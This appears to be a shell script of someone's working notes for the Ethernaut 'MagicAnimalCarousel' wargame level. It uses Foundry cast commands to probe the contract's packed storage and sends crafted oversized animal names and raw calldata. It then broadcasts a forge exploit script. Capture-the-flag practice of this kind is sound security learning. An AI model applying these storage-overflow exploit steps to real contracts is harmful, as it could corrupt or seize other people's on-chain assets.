source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

INSTANCE=0x2cd1638a3cb327B8cF957D5B985d6eA6CdC79FE0


# cast call \
#     --rpc-url $RPC_URL \
#     $INSTANCE \
#     "currentCrateId()(uint256)"
# # # -> 0

# # cast call \
# #     --rpc-url $RPC_URL \
# #     $INSTANCE \
# #     "encodeAnimalName(string)(uint256)" "cat"
# # -> 30756829571327793712544612352

# # cast send \
# #     --rpc-url $RPC_URL \
# #     --private-key $PRIVATE_KEY \
# #     $INSTANCE \
# #     "setAnimalAndSpin(string)()" "Cat"

# # cast call \
# #     --rpc-url $RPC_URL \
# #     $INSTANCE \
# #     "carousel(uint256)(uint256)" 1
# # 0 -> 1461501637330902918203684832716283019655932542976
# # 1 -> 0
# # then i set cat: 1 -> 44951156777603103434328014152026263480775167058119828303951469777893190335572
# # this in hex: 636174000000000000000002B321099CF86D9BB913B891441B014C03A6CCFC54
# # which is "cat" + nextId (2) + owner (me)
# # 2 -> 0

# # i want to put an animal, and then when i read it, it is not the same one

# # cast send \
# #     --rpc-url $RPC_URL \
# #     --private-key $PRIVATE_KEY \
# #     $INSTANCE \
# #     --data \
# #     0x932289cc 0x10000000000000000000FFFF 0000000000000000000000000000000000000000000000000000000000000001

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     $INSTANCE \
#     "changeAnimal(string, uint256)()" "ÿÿ" 2



# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     $INSTANCE \
#     "setAnimalAndSpin(string)()" "Catbutzz"

forge script script/Exploit.s.sol:MagicAnimalCarouselScript --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vvvv --evm-version cancun

